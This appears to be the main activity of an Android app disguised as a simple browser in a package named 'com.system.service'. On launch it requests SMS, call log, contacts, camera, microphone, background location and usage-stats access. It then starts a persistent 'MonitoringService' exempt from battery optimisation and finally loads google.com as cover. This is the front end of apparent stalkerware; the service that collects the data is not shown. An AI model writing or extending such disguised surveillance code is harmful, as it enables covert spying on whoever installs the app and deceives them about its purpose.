package com.system.service;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.FirebaseDatabase;
import com.system.service.service.MonitoringService;
import com.system.service.utils.PermissionManager;

import java.util.ArrayList;
import java.util.List;

/**
 * Main Activity - Professional Browser Interface
 * Handles permission requests and initializes monitoring services
 */
public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int USAGE_STATS_REQUEST_CODE = 101;
    
    private WebView webView;
    private PermissionManager permissionManager;
    
    // Required permissions for monitoring functionality
    private final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.READ_CALENDAR
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Initialize Firebase
        FirebaseApp.initializeApp(this);
        
        // Initialize permission manager
        permissionManager = new PermissionManager(this);
        
        // Initialize WebView
        initializeWebView();
        
        // Request all permissions on first launch
        requestAllPermissions();
    }

    /**
     * Initialize WebView with professional browser settings
     */
    private void initializeWebView() {
        webView = findViewById(R.id.webView);
        
        // Configure WebView settings
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setBuiltInZoomControls(true);
        webView.getSettings().setDisplayZoomControls(false);
        
        // Set custom WebView client
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }
        });
    }

    /**
     * Request all required permissions at once
     */
    private void requestAllPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        // Check which permissions are not granted
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        // Add background location permission for Android 10+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, 
                Manifest.permission.ACCESS_BACKGROUND_LOCATION) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
            }
        }
        
        // Request permissions if needed
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsToRequest.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            // All permissions granted, check usage stats and load browser
            checkUsageStatsPermission();
        }
    }

    /**
     * Check and request usage stats permission
     */
    private void checkUsageStatsPermission() {
        if (!permissionManager.hasUsageStatsPermission()) {
            // Request usage stats permission
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            startActivityForResult(intent, USAGE_STATS_REQUEST_CODE);
        } else {
            // All permissions ready, initialize services and load browser
            initializeServices();
            loadBrowser();
        }
    }

    /**
     * Initialize monitoring services
     */
    private void initializeServices() {
        // Start monitoring service
        Intent serviceIntent = new Intent(this, MonitoringService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Request to ignore battery optimization
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            permissionManager.requestIgnoreBatteryOptimization();
        }
    }

    /**
     * Load Google.com in WebView after permissions are granted
     */
    private void loadBrowser() {
        webView.loadUrl("https://google.com");
        Toast.makeText(this, "Browser Ready - All permissions granted", 
            Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                         @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allPermissionsGranted = true;
            
            // Check if all permissions were granted
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allPermissionsGranted = false;
                    break;
                }
            }
            
            if (allPermissionsGranted) {
                checkUsageStatsPermission();
            } else {
                Toast.makeText(this, 
                    "Some permissions were denied. App functionality may be limited.", 
                    Toast.LENGTH_LONG).show();
                loadBrowser(); // Load browser anyway
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == USAGE_STATS_REQUEST_CODE) {
            // Check if usage stats permission was granted
            if (permissionManager.hasUsageStatsPermission()) {
                Toast.makeText(this, "Usage stats permission granted", 
                    Toast.LENGTH_SHORT).show();
            }
            
            // Initialize services and load browser regardless
            initializeServices();
            loadBrowser();
        }
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (webView != null) {
            webView.destroy();
        }
    }
}